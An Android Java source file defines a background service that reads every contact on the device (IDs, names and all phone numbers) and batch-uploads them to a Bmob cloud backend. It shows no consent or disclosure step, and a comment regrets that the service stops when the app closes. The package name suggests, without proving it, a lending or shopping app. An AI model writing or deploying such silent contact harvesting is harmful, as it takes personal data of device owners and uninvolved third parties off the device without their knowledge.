package com.zhimadai.cctvmall.android_upload_service.service;

import android.app.IntentService;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;

import com.zhimadai.cctvmall.android_upload_service.entity.Contact;

import java.util.ArrayList;
import java.util.List;

import cn.bmob.v3.BmobBatch;
import cn.bmob.v3.BmobObject;
import cn.bmob.v3.datatype.BatchResult;
import cn.bmob.v3.exception.BmobException;
import cn.bmob.v3.listener.QueryListListener;



//这个不好用，一退出程序就停止了
public class ContactIntentService extends IntentService {

    public static final String TAG = "ContactIntentService";

    public ContactIntentService() {
        super("ContactIntentService");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        showContacts();
    }

    public void showContacts() {

        List<BmobObject> contactList = new ArrayList<>();
        int num = 0;

        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null,
                null, null);
        if (cursor == null) {
            Log.e(TAG, "显示联系人错误");
            return;
        }

        while (cursor.moveToNext()) {
            num++;

            StringBuilder stringBuilder = new StringBuilder();
            Contact contact = new Contact();
            //ID
            String contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts
                    ._ID));
//            contact.setPhoneId("ID：" + contactId);
            contact.setPhoneId(contactId);

            //name
            String contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts
                    .DISPLAY_NAME));
//            contact.setPhoneName("名字：" + contactName);
            contact.setPhoneName(contactName);


            // 根据联系人ID查询对应的电话号码
            Cursor phonesCursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone
                            .CONTENT_URI,
                    null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + contactId,
                    null, null);
            // 取得电话号码(可能会存在多个号码)
            if (phonesCursor != null) {
                int num1 = 1;
                while (phonesCursor.moveToNext()) {
                    stringBuilder.append("号码"+num1+"：");
                    String phoneNumber = phonesCursor.getString(phonesCursor.getColumnIndex
                            (ContactsContract.CommonDataKinds.Phone.NUMBER));
                    stringBuilder.append(phoneNumber);
                    stringBuilder.append("\n");
                    num1++;
                }
                phonesCursor.close();
                contact.setPhoneNumber(stringBuilder.toString());
            }
            //bmob一次最多只能上传50条。。。尴尬。。。 -_- @_@ #_# $_$ ^_^一波表情包
            if (contactList.size() < 50) {
                contactList.add(contact);
            }

            Log.i(TAG, "已读：" + num + "条联系人====="+contactName);
        }

        cursor.close();


        //上传联系人
        new BmobBatch().insertBatch(contactList).doBatch(new QueryListListener<BatchResult>() {

            @Override
            public void done(List<BatchResult> o, BmobException e) {
                if (e == null) {
                    for (int i = 0; i < o.size(); i++) {
                        BatchResult result = o.get(i);
                        BmobException ex = result.getError();
                        if (ex == null) {
                            Log.i(TAG, "第" + i + "个数据批量添加成功：" + result.getCreatedAt() + "," +
                                    result.getObjectId() + "," + result.getUpdatedAt());
                        } else {
                            Log.i(TAG, "第" + i + "个数据批量添加失败：" + ex.getMessage() + "," + ex
                                    .getErrorCode());
                        }
                    }
                } else {
                    Log.i(TAG, "失败：" + e.getMessage() + "," + e.getErrorCode());
                }
            }
        });

    }

}
